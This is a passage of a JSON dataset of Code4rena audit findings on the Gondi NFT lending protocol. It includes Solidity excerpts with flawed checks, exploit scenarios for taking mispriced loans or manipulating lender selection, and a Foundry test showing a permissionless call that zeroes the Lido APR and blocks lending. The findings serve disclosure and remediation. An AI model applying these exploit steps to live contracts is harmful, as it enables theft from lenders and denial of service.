in with a `false` value for the `_enable` flag.\n> \n> I am slightly mixed in relation to this submission as the `MultiSourceLoan::delegate` function can be utilized with a correct payload to remove delegation from the previous user correctly. I believe that users, protocols, etc., will attempt to use the `MultiSourceLoan::revokeDelegate` function to revoke their delegation, and thus, a medium-risk severity rating is appropriate even though a circumvention already exists in the code.\n> \n> To note, the code also goes against its `interface` [specification](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/interfaces/loans/IMultiSourceLoan.sol#L257-L261) further re-inforcing a medium-risk rating level.\n\n***",
      "summary": "\nThis report discusses a bug in the Delegate.Cash protocol that allows an old borrower to use an old delegation to claim on behalf of a new borrower. The problem arises when a borrower delegates locked collateral NFT through `delegateRegistry` to prove token ownership and claim airdrops, event ticketing, etc. Currently, the `MultiSourceLoan::delegate` function allows a borrower to configure custom rights to `delegateERC721`, but the `MultiSourceLoan::revokeDelegate` function does not allow passing `bytes32 _rights` into `delegateERC721()` to correctly revoke existing delegations with custom rights. This means that when a borrower tries to remove the delegation, the old delegation is not cleared and the old borrower can still claim on behalf of the new borrower. The recommended mitigation step is to update the `revokeDelegate()` function to allow passing `bytes32 _rights` to properly revoke the delegation. This bug has been confirmed by 0xend (Gondi) and commented on by 0xsomeone (judge) who has given it a medium-risk severity rating.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "https://github.com/code-423n4/2024-06-gondi-findings/issues/2",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "35266",
      "title": "[M-02] `AprPremium` calculation might be incorrect due to loss of precision",
      "impact": "MEDIUM",
      "content": "In OraclePoolOfferHandler.sol, `AprPremium` is calculated partially based on the ratio of total outstanding assets over total assets. This issue is the ratio is not scaled properly to BPS decimals before adding to `aprFactors.minPremium`.\n\nBased on code comments, `utilizationFactor` is in `PRECISION` (`1e27`), and `minPremium` is in `BPS(1e4)`.\n\n```solidity\n    /// @notice UtilizationFactor Expressed in `PRECISION`. minPremium in BPS\n    struct AprFactors {\n        uint128 minPremium;\n        uint128 utilizationFactor;\n    }\n```\n\nIn `_calculateAprPremium()`, `(totalOutstanding.mulDivUp(aprFactors.utilizationFactor, totalAssets * PRECISION)` is not scaled to BPS before adding `aprFactors.minPremium`.\n\n```solidity\n    function _calculateAprPremium() private view returns (uint128) {\n        /// @dev cached\n        Pool pool = Pool(getPool);\n        AprFactors memory aprFactors = getAprFactors;\n        uint256 totalAssets = pool.totalAssets();\n        uint256 totalOutstanding = totalAssets - pool.getUndeployedAssets();\n        return uint128(\n|>          totalOutstanding.mulDivUp(aprFactors.utilizationFactor, totalAssets * PRECISION) + aprFactors.minPremium\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/OraclePoolOfferHandler.sol#L396\n\n**Examples**\n\n1. `deployedAssets = 1e18`, `totalAssets = 4e18`, `aprFactors.utilizationFactor = 0.01e27`, `aprFactor.minPremium = 500` (5%), `PRECISION = 1e27`.\n    - Calculated apr premium = 1 + 500 = 501\n    - Expected apr premium: 25 + 500 = 525\n\n2. `deployedAssets = 3.9e18`, `totalAssets = 4e18`, `aprFactors.utilizationFactor = 0.01e27`, `aprFactors.minPremium = 500` (5%), `PRECISION = 1e27`.\n    - Calculated apr premium = 1 + 500 = 501\n    - Expected apr premium: 98 + 500 = 598\n\n### Recommended Mitigation Steps\n\nScale up `totalOutstanding` by 1e4 before performing division and addition.\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-06-gondi-findings/issues/3#event-13414586503)**\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-06-gondi-findings/issues/3#issuecomment-2220202556):**\n > The Warden outlines how inconsistent units are employed in the APR premium calculations of the `OraclePoolOfferHandler`, resulting in a lower-than-expected APR in all circumstances.\n> \n> I believe a medium-risk severity rating is appropriate given that the miscalculation would permit offers with a higher APR than expected to be validated and thus higher interest loans to be processed by the system as valid.\n\n***",
      "summary": "\nThe bug report discusses an issue in the code of the OraclePoolOfferHandler.sol file, where the calculation of `AprPremium` is not scaled properly to BPS decimals before being added to `aprFactors.minPremium`. This results in an incorrect APR premium being calculated, which can lead to higher interest loans being processed as valid. The recommended mitigation step is to scale up the `totalOutstanding` variable before performing division and addition. The severity of this bug is rated as medium-risk.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "https://github.com/code-423n4/2024-06-gondi-findings/issues/3",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "35265",
      "title": "[M-01] Anyone can DOS `OraclePoolOfferHandler` setting `collectionFactors`",
      "impact": "MEDIUM",
      "content": "In OraclePoolOfferHandler.sol, `collecitonFactors` are set in a two-step process. The owner will propose collection factors through `setCollectionFactors()`, which writes to [`getProposedCollectionFactors`](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/OraclePoolOfferHandler.sol#L237) mapping. After a minimal delay, anyone can call `confirmCollectionFactors` with collection data to confirm proposed values.\n\nThe problem is, `confirmCollectionFactors` has insufficient checks on caller-supplied collection data. Currently, only the array lengths submitted are verified. There is no check on whether each array element is duplicated, non-zero, or an already confirmed value.\n\n```solidity\n//src/lib/pools/OraclePoolOfferHandler.sol\n    function confirmCollectionFactors(\n        address[] calldata _collection,\n        uint96[] calldata _duration,\n        bytes[] calldata _extra,\n        PrincipalFactors[] calldata _factor\n    ) external {\n...\n        uint256 updates = _collection.length;\n        //@audit-info note: only array length is checked\n        if (\n|>          getTotalUpdatesPending != updates ||\n            updates != _duration.length ||\n            updates != _factor.length ||\n            updates != _extra.length\n        ) {\n            revert InvalidInputLengthError();\n        }\n\n        for (uint256 i; i < updates; ) {\n            bytes32 key = _hashKey(_collection[i], _duration[i], _extra[i]);\n            PrincipalFactors\n                memory proposedFactor = getProposedCollectionFactors[key];\n            //@audit getProposeCollectionFactors is a mapping that is never reset, a caller can pass arrays with 0 value elements, which will pass the check. Caller can also pass already confirmed keys and values.\n            if (\n|>              proposedFactor.floor != _factor[i].floor ||\n                proposedFactor.historicalFloor != _factor[i].historicalFloor\n            ) {\n                revert InvalidInputError();\n            }\n            _principalFactors[key] = proposedFactor;\n            unchecked {\n                ++i;\n            }\n        }\n        //@audit After setting 0 values, or already confirmed values, the TS reset. The owner has to propose again. \n|>      getProposedCollectionFactorsSetTs = type(uint256).max;\n        getTotalUpdatesPending = 0;\n...\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/OraclePoolOfferHandler.sol#L265-L266\n\nBecause `getProposedCollectionFactors` mapping is never cleared, there are multiple ways to exploit:\n1. The caller can call `confirmCollectionFactors()` with 0 values array.\n2. The caller can call with already confirmed key and value pairs.\n3. The caller can set duplicated values; After the call `getProposedCollectionFactorsSetTs` is reset, and the owner has to propose factors again.\n\n### Recommended Mitigation Steps\n\nConsider storing proposed keys in a transient storage array. `ConfirmCollectionsFactors()` only need to iterate over the storage key array.\n\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-06-gondi-findings/issues/4#event-13414642037)**\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-06-gondi-findings/issues/4#issuecomment-2220188840):**\n > The Warden has outlined how the proposal and confirmation functions can become disconnected given that there is insufficient input validation when confirming a collection's factors. \n> \n> I believe a medium-risk rating is appropriate for this submission given that no special privileges are necessary to exploit it, and an important function of the system albeit not critical is impacted and can be denied repetitively.\n\n***",
      "summary": "\nThe bug report discusses a vulnerability in the `confirmCollectionFactors` function in the `OraclePoolOfferHandler.sol` file. This function allows the owner to propose collection factors, which are then confirmed by anyone after a minimal delay. However, the function does not have sufficient checks on the data provided by the caller, making it possible for them to exploit the system in three different ways. The proposed solution is to store the proposed keys in a temporary storage array to prevent this vulnerability. The Warden has rated this bug as medium-risk, as it can be exploited without any special privileges and affects an important function of the system. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "https://github.com/code-423n4/2024-06-gondi-findings/issues/4",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "35264",
      "title": "[H-03] `OraclePoolOfferHandler` has an invalid check on `collateralTokenId`, incorrect loan offers can pass validation",
      "impact": "HIGH",
      "content": "In `OraclePoolOfferHandler::validateOffer`, loan offer terms can be validated in [three ways](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/OraclePoolOfferHandler.sol#L19-L24):\n1. Range (collateral tokens ids in a certain range will have a corresponding [`PrincipalFactor` used to calculate `maxPrincipal` allowed](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/OraclePoolOfferHandler.sol#L315)).\n2. Merkle root.\n3. Individual token id.\n\nIn the case of a range validation (`validationData.code == 1`), `_getFactors()` has an incorrect check implementation. The check will not revert when the `collateralTokenId` is out of range.\n\n```solidity\n//src/lib/pools/OraclePoolOfferHandler.sol\n    function _getFactors(\n        address _collateralAddress,\n        uint256 _collateralTokenId,\n        uint256 _duration,\n        IBaseLoan.OfferValidator[] memory _validators\n    ) private view returns (PrincipalFactors memory) {\n        bytes32 key;\n        if (_validators.length == 0) {\n...\n        } else if (\n            _validators.length == 1 && _isZeroAddress(_validators[0].validator)\n        ) {\n            PrincipalFactorsValidationData memory validationData = abi.decode(\n                _validators[0].arguments,\n                (PrincipalFactorsValidationData)\n            );\n            if (validationData.code == 1) {\n                 // Range\n                (uint256 min, uint256 max) = abi.decode(validationData.data, (uint256, uint256));\n                //@audit invalid check condition. Should be `_collateralTokenId < min || _collateralTokenId > max`\n|>              if (_collateralTokenId < min && _collateralTokenId > max) {\n                    revert InvalidInputError();\n                }\n                key = _hashKey(_collateralAddress, uint96(_duration), validationData.data);\n...\n        return _principalFactors[key];\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/OraclePoolOfferHandler.sol#L359-L360\n\nAs seen, an out-of-range `collateralTokenId` can pass the check, resulting in invalid `principalFactors` used in loan validation.\n\n```solidity\n//src/lib/pools/OraclePoolOfferHandler.sol\n    function validateOffer(uint256 _baseRate, bytes calldata _offer)\n        external\n        view\n        override\n        returns (uint256, uint256)\n    {\n...\n        PrincipalFactors memory factors = _getFactors(\n            offerExecution.offer.nftCollateralAddress,\n            offerExecution.offer.nftCollateralTokenId,\n            duration,\n            offerExecution.offer.validators\n        );\n\n        uint128 maxPrincipalFromCurrentFloor = uint128(uint256(currentFloor.value).mulDivDown(factors.floor, PRECISION));\n        uint128 maxPrincipalFromHistoricalFloor =\n            uint128(uint256(historicalFloor.value).mulDivDown(factors.historicalFloor, PRECISION));\n        uint256 maxPrincipal = maxPrincipalFromCurrentFloor > maxPrincipalFromHistoricalFloor\n            ? maxPrincipalFromHistoricalFloor\n            : maxPrincipalFromCurrentFloor;\n        //@audit-info maxPrincipal is based on returned principalFactors from _getFactors. Invalid range check in _getFactors() compromises validateOffer\n|>      if (offerExecution.amount > maxPrincipal) {\n            revert InvalidPrincipalAmountError();\n        }\n...\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/OraclePoolOfferHandler.sol#L329-L330\n\n### Recommended Mitigation Steps\n\nChange the check condition into `if(_collateralTokenId < min || _collateralTokenId > max) {//revert`.\n\n### Assessed type\n\nError\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-06-gondi-findings/issues/6#issuecomment-2220161790):**\n > This submission was initially mistakenly set as a duplicate of [#7](https://github.com/code-423n4/2024-06-gondi-findings/issues/7); however, upon closer inspection, it is a distinct vulnerability.\n> \n> Specifically, the `min` and `max` range checks performed by the `OraclePoolOfferHandler::_getFactors` function appear to be invalid. This will permit a collection-level offer that has a specific range of token IDs to have its restriction bypassed.\n> \n> I had requested the Sponsor's feedback for this submission on exhibit #7 and have queried for it again to ensure a fully informed judgment is issued for this submission. However, I am inclined to keep it as a valid high-risk vulnerability at this point based on similar rationale as the one laid out in #7; significant functionality of the protocol is impacted and the vulnerability can be exploited for profit at the expense of users by supplying less lucrative token IDs.\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-06-gondi-findings/issues/6#event-13459919778)**\n\n***",
      "summary": "\nThis bug report is about a vulnerability found in the `OraclePoolOfferHandler::validateOffer` function of the `OraclePoolOfferHandler.sol` file. The function is responsible for validating loan offer terms in three ways: through a range, a Merkle root, or an individual token id. However, the range validation check has an incorrect implementation, which allows an out-of-range `collateralTokenId` to pass the check. This results in invalid `principalFactors` being used in loan validation, which can be exploited for profit at the expense of users. The recommended mitigation step is to change the check condition to `if(_collateralTokenId < min || _collateralTokenId > max) {//revert}`. This vulnerability has been confirmed by the Gondi team and is classified as a high-risk vulnerability. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "https://github.com/code-423n4/2024-06-gondi-findings/issues/6",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "35263",
      "title": "[H-02] OraclePoolOfferHandler's `_getFactors` allows exact `tokenId` offer terms to be used for collection offers. A borrower can take on a loan with incorrect terms",
      "impact": "HIGH",
      "content": "In MultiSourceLoan.sol, a loan `offerExectuion` can be either a collection offer or an exact collateral token Id match offer. In a collection offer, the loanOffer's `collateralTokenId` doesn't have to match the borrower-supplied token id.\n\n**1. `MutlisSourceLoan::_checkValidators`:**\n\nThe condition checks for a collection offer is [one empty validator address](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L881-L882) in struct LoanOffer. (`(totalValidators == 1) && _loanOffer.validators[0].validator == address(0)`).\n\nThe condition check for exact Id match is either [`loanOffer.nftCollateralTokenId != 0`](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L873-L875) or [`loanOffer.nftCollateralTokenId == 0 && totalValidators.length == 0`](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L879).\n\n**2. `OraclePoolOfferHandler::_getFactors`:**\n\nThe condition checks for a collection offer is [`totalValidators.length == 0`](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/OraclePoolOfferHandler.sol#L351-L352). This is the opposite of number 1.\n\nThe condition checks for an exact Id offer is [one empty validator address](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/OraclePoolOfferHandler.sol#L353). (`_validators.length == 1 && _isZeroAddress(_validators[0].validator)`) Also the opposite of number 1.\n\n`MutlisSourceLoan::_checkValidators` and `OraclePoolOfferHandler::_getFactors` are invoked in the same `_validateOfferExecution()` call: \n\n( `MultiSourceLoan::emitLoan()->_processOffersFromExecutionData()-> _validateOfferExecution() -> Pool.validateOffer() / _checkValidators()`)\n\nImpacts: A borrower's exact token id match OfferExecution will be validated against a collection offer term. Or vice versa, a borrower's collection `offerExecution` will be validated against any specific token-based term.\n\nSuppose:\n- `_hashKey(wrappedPunk, 30 days, tokenId 0)`'s principal factor is (50%, 25%).\n- `_hashKey(wrappedPunk, 30 days, tokened 1)`'s principal factor is (33%, 16.67%).\n- `_hashKey(wrappedPunk, 30 days, \"\")`'s principal factor is (25%, 12.5%).\n\n`wrappedPunk`'s `currentFloor.value = historicalFloor.value = 1000` usd.\n\n`MaxPrincipal`:\n- `tokenId` 0: 250 usd\n- `tokenId` 1: 166.67 usd\n- collection offer: 125 usd\n\nAlice can borrow using a cheap `tokenId` 1 as collateral, but with a LoanOffer based on `tokenId` 0 with a higher `MaxPrincipal`.\n\nAlice's `ExecutionData`:\n- `ExecutionData.tokenId` = 1,\n- `ExecutionData.OfferExecution\\[0].LoanOffer.nftCollateralTokenId` = 0,\n- `ExecutionData.OfferExecution\\[0].LoanOffer.validators.length` == 1,\n- `ExecutionData.OfferExecution\\[0].LoanOffer.validators\\[0]` = `address(0)`,\n- `ExecutionData.OfferExecution\\[0].LoanOffer.validators.arguments.code` = 3, (individual)\n- `ExecutionData.OfferExecution\\[0].LoanOffer.validators.arguments.data` = uint(0),(`tokenId` 0)\n- `ExecutionData.OfferExecution\\[0].amount` = 250 usd\n\nAlice's emitLoan tx succeeds. She transferred a cheaper token 1 but got 250 usd principal.\n\nBob uses a more expansive `tokenId` 0 as collateral for higher principal. Bob needs an exact `tokenId` offer term match so his `validators.length == 0`. \n\nBob's `ExeuctionData`:\n- `ExecutionData.tokenId` = 0,\n- `ExecutionData.OfferExecution\\[0].LoanOffer.nftCollateralTokenId` = 0,\n- `ExecutionData.OfferExecution\\[0].LoanOffer.validators.length` == 0,\n- `ExecutionData.OfferExecution\\[0].amount` = 250 usd\n\nBob's emitLoan tx reverted. Even though he has the expensive token 0, his offer is validated as a collection offer with a max 125 usd allowance.\n\n### Recommended Mitigation Steps\n\nIn `_getFactors()`, consider swaping the if condition `_validator.length==0` with `_validators.length == 1 && _isZeroAddress(_validators[0].validator)`.\n\n### Assessed type\n\nError\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-06-gondi-findings/issues/7#event-13414606817)**\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-06-gondi-findings/issues/7#issuecomment-2220143528):**\n > The Warden has demonstrated how the offer type conditionals across the codebase are inconsistent permitting a token ID-specific offer type to be used for a collection-level offer and vice versa.\n> \n> I believe a high-risk severity rating is appropriate given that the vulnerability demonstrated can be utilized to cause unfair loans to be taken out at the expense of lenders, and a significant feature of the protocol is impacted. \n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2024-06-gondi-findings/issues/7).*\n\n***",
      "summary": "\nBug report summary:\n\nThe bug report discusses an inconsistency in the code of MultiSourceLoan.sol and OraclePoolOfferHandler.sol. This inconsistency allows for a borrower to use a cheaper token as collateral while receiving a higher principal, and for a borrower to be rejected for using an expensive token as collateral. This bug has a high-risk severity rating as it can lead to unfair loans being taken out at the expense of lenders. The recommended mitigation step is to swap the if conditions in `_getFactors()` to fix this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "https://github.com/code-423n4/2024-06-gondi-findings/issues/7",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "35262",
      "title": "[H-01] Lido's apr can be maliciously updated to 0 value due to missing `getLidoUpdateTolerance` check, DOS pool lending",
      "impact": "HIGH",
      "content": "Function `updateLidoValues()` is permissionless and missing the [`getLidoupdateTolerance` check](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/LidoEthBaseInterestAllocator.sol#L95). Lido’s stETH [rebases daily](https://docs.lido.fi/guides/lido-tokens-integration-guide#accounting-oracle). A malicious actor can call `updateLidoValues()` between rebasing to directly set `lidoData.aprBps` to 0. Once set, this DOS pool lending, because calling `getBaseAprWithUpdate()` will always revert with `InvalidAprError`.\n\n```solidity\n//src/lib/pools/LidoEthBaseInterestAllocator.sol\n    //@audit anyone can call updateLidoValues at any time, risks of _lidoData.aprBps being set to 0.\n    function updateLidoValues() external {\n        _updateLidoValues(getLidoData);\n    }\n\n    function _updateLidoValues(LidoData memory _lidoData) private {\n        uint256 shareRate = _currentShareRate();\n        _lidoData.aprBps = uint16(\n            (_BPS * _SECONDS_PER_YEAR * (shareRate - _lidoData.shareRate)) /\n                _lidoData.shareRate /\n                (block.timestamp - _lidoData.lastTs)\n        );\n        _lidoData.shareRate = uint144(shareRate);\n        _lidoData.lastTs = uint96(block.timestamp);\n        getLidoData = _lidoData;\n        emit LidoValuesUpdated(_lidoData);\n    }\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/LidoEthBaseInterestAllocator.sol#L105-L106\n\nSee added unit test:\n\n```solidity\n//test/pools/LidoEthBaseInterestAllocator.t.sol\n...\n    function testMaliciousUpdateLidoValues() public {\n        assertEq(_baseAllocator.getBaseAprWithUpdate(), 1000);\n        (uint96 lastTs, , ) = _baseAllocator.getLidoData();\n        vm.warp(uint256(lastTs) + 12);\n        _baseAllocator.updateLidoValues();\n        (, , uint16 newAprBps) = _baseAllocator.getLidoData();\n        assertEq(newAprBps, 0);\n        vm.expectRevert(abi.encodeWithSignature(\"InvalidAprError()\"));\n        _baseAllocator.getBaseAprWithUpdate();\n    }\n...\n```\n\n```\nRan 1 test for test/pools/LidoEthBaseInterestAllocator.t.sol:LidoEthBaseInterestAllocatorTest\n[PASS] testMaliciousUpdateLidoValues() (gas: 30835)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.93ms (486.17µs CPU time)\n```\n\n### Recommended Mitigation Steps\n\nIn `updateLidoValues()`, consider adding check to only run `_updateLidoValues()` when `(block.timestamp - lidoData.lastTs > getLidoUpdateTolerance)`.\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-06-gondi-findings/issues/9#event-13414822150)**\n\n**[0xsomeone (judge) increased severity to High and commented](https://github.com/code-423n4/2024-06-gondi-findings/issues/9#issuecomment-2220116640):**\n > The Warden outlines how the lack of a timestamp-related validation check when updating Lido's APR permits the APR measurements from the `LidoEthBaseInterestAllocator` to revert due to the relevant metric becoming `0`.\n> \n> A malicious user can repeatedly perform this attack at will by following any valid APR measurement by a re-measurement causing it to always be `0`. In turn, this would lead to the pool not being able to validate new offers and effectively result in a permanent Denial-of-Service with significant impact.\n> \n> As a result of the above analysis, I believe a high-risk rating is appropriate for this submission given that an important feature of the protocol can be repetitively denied for an indeterminate amount of time.\n\n***",
      "summary": "\nThis bug report is about a function called `updateLidoValues()` in the code for Lido, a protocol for staking Ethereum. The function is missing a check that could allow a malicious actor to set a value to 0, which would cause problems with the pool's lending. The report also includes a suggested solution and notes from the person who confirmed the bug and a judge who increased the severity rating.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "https://github.com/code-423n4/2024-06-gondi-findings/issues/9",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "35261",
      "title": "[G-04] Redundant code",
      "impact": "GAS",
      "content": "\nIn `AuctionLoanLiquidator::placeBid`, the check for the increment of the highest bid is repeated as it is done already in the `_placeBidChecks` method. Consider removing the one within the function ([here](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/AuctionLoanLiquidator.sol#L229C1-L232C10)):\n\n```solidity\n    /// @inheritdoc IAuctionLoanLiquidator\n    function placeBid(address _nftAddress, uint256 _tokenId, Auction memory _auction, uint256 _bid)\n        external\n        nonReentrant\n        returns (Auction memory)\n    {\n        _placeBidChecks(_nftAddress, _tokenId, _auction, _bid);\n         \n        // @audit already done in _placeBidChecks\n        uint256 currentHighestBid = _auction.highestBid;\n        if (_bid == 0 || (currentHighestBid.mulDivDown(_BPS + MIN_INCREMENT_BPS, _BPS) >= _bid)) {\n            revert MinBidError(_bid);\n        }\n\n        ...\n\n    function _placeBidChecks(address _nftAddress, uint256 _tokenId, Auction memory _auction, uint256 _bid)\n        internal\n        view\n        virtual\n    {\n        _checkAuction(_nftAddress, _tokenId, _auction);\n        if (_bid == 0 || (_auction.highestBid.mulDivDown(_BPS + MIN_INCREMENT_BPS, _BPS) >= _bid)) {\n            revert MinBidError(_bid);\n        }\n    }\n```\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35260",
      "title": "[G-03] Optimization when emitting `MultiSourceLoanUpdated`",
      "impact": "GAS",
      "content": "\nAs `_pendingMultiSourceLoanAddress` becomes `address(0)`, then there is no need to do an additional `SLOAD` in the event emission, just set it to `address(0)` ([see here](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/callbacks/PurchaseBundler.sol#L246)).\n\n```solidity\n\n    /// @inheritdoc IPurchaseBundler\n    function finalUpdateMultiSourceLoanAddress(address _newAddress) external onlyOwner {\n        if (_pendingMultiSourceLoanAddress != _newAddress) {\n            revert InvalidAddressUpdateError();\n        }\n\n        _multiSourceLoan = MultiSourceLoan(_pendingMultiSourceLoanAddress);\n        _pendingMultiSourceLoanAddress = address(0);\n\n        emit MultiSourceLoanUpdated(_pendingMultiSourceLoanAddress);  // should be address(0)\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35259",
      "title": "[G-02] Cached `lidoData` not used",
      "impact": "GAS",
      "content": "\nWhen reading the `aprBps` field of the `LidoData` struct, the fourth line reads from storage instead of the cached one. Consider using `lidoData` instead of `getLidoData`, which saves 1 `SLOAD` ([see here](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/LidoEthBaseInterestAllocator.sol#L77)).\n\n```solidity\n    /// @inheritdoc IBaseInterestAllocator\n    function getBaseApr() external view override returns (uint256) {\n        LidoData memory lidoData = getLidoData;\n        uint256 aprBps = getLidoData.aprBps;\n        if (block.timestamp - lidoData.lastTs > getLidoUpdateTolerance) {\n            uint256 shareRate = _currentShareRate();\n            aprBps = uint16(\n                _BPS * _SECONDS_PER_YEAR * (shareRate - lidoData.shareRate) / lidoData.shareRate\n                    / (block.timestamp - lidoData.lastTs) // @audit no me enteroadgahdhjadgadc\n            );\n        }\n        if (aprBps == 0) {\n            revert InvalidAprError();\n        }\n        return aprBps;\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35258",
      "title": "[G-01] Redundant calls to `vaultExists` modifier with the same `_vaultId`",
      "impact": "GAS",
      "content": "\nThere are two identical calls to the same modifier with the same arguments, which is redundant. Remove one of them ([see here](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/UserVault.sol#L219)):\n\n```solidity\n    /// @inheritdoc IUserVault\n    /// @dev Read `depositERC721`.                               .---------------------.----------------------------- redundant\n    function depositEth(uint256 _vaultId) external payable vaultExists(_vaultId) vaultExists(_vaultId) {\n        _vaultERC20s[ETH][_vaultId] += msg.value;\n\n        emit ERC20Deposited(_vaultId, ETH, msg.value);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35257",
      "title": "[18] Function `settleWithBuyout()` incorrectly calculate the main lender because single lender can have multiple tranches in a loan",
      "impact": "LOW",
      "content": "\n*Note: At the judge’s request [here](https://github.com/code-423n4/2024-04-gondi-findings/issues/70#issuecomment-2067964983), this downgraded issue from the same warden has been included in this report for completeness.*\n\nhttps://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/AuctionWithBuyoutLoanLiquidator.sol#L69\n\n### Impact\n\nThe `settleWithBuyout()` function is used to settle an auction with a buyout from the main lender. It calculates the main lender by looping through all the tranches and selecting the lender of the largest tranche as the main lender.\n\n```solidity\nuint256 largestTrancheIdx;\nuint256 largestPrincipal;\nfor (uint256 i = 0; i < _loan.tranche.length;) {\n    if (_loan.tranche[i].principalAmount > largestPrincipal) {\n        largestPrincipal = _loan.tranche[i].principalAmount;\n        largestTrancheIdx = i;\n    }\n    unchecked {\n        ++i;\n    }\n}\n```\n\nHowever, this is incorrect as a single lender could have multiple tranches. This could be abused by a borrower to manipulate the selection of the main lender.\n\n### Proof of Concept\n\nConsider the following scenario:\n\n1. Alice (lender) offers to lend 40 eth.\n2. Bob (another lender) offers to lend 20 eth.\n3. Caleb (borrower) wants to allow Bob, not Alice, to buyout his NFT but still wants to borrow all 40 eth from Alice. He can take partial loan from Alice like this:\n\n```solidity\ntranche = [\n  0: 20 eth from Bob\n  1: 20 eth from Alice\n  2: 0.01 eth from Caleb\n  3: 20 eth from Alice\n]\n```\n\nAs you can see, even though Alice lend 40 eth to Caleb, Bob will be the main lender. And also since the tranche of Alice is not consecutive (Caleb intentionally put 0.01 eth in 